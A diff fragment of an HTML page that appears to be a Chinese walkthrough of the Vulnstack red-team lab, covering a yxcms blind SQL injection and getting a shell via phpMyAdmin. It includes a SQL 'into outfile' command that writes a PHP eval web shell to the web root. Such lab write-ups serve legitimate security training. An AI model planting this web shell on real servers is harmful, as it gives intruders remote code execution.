@@ -513,7 +513,6 @@
 <p>​    使用蚁剑成功连接shell</p>
 <p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316112139929.png"></p>
 <h5 id="3-2-1-5-漏洞五：yxcms后台SQL注入漏洞"><a href="#3-2-1-5-漏洞五：yxcms后台SQL注入漏洞" class="headerlink" title="3.2.1.5 漏洞五：yxcms后台SQL注入漏洞"></a>3.2.1.5 漏洞五：yxcms后台SQL注入漏洞</h5><p>​    在后台的碎片列表中进行删除操作，删除碎片ID可能存在盲注漏洞，使用dnslog获取SQL注入得到数据。</p>
-<p>yxcms漏洞代码原理解析参考文章<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/162886.html">https://www.freebuf.com/column/162886.html</a></p>
 <h5 id="3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell"><a href="#3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell" class="headerlink" title="3.2.1.6 漏洞六：PhpMyAdmin开启全局日志getshell"></a>3.2.1.6 漏洞六：PhpMyAdmin开启全局日志getshell</h5><p>​    前面我们已经登陆到phpmyadmin，那么我们首先可以测试一下是否可以使用select into outfile直接写入</p>
 <pre class="line-numbers language-none"><code class="language-none">Select &#39;&lt;?php eval($_POST[hack]);?&gt; &#39; into outfile &#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
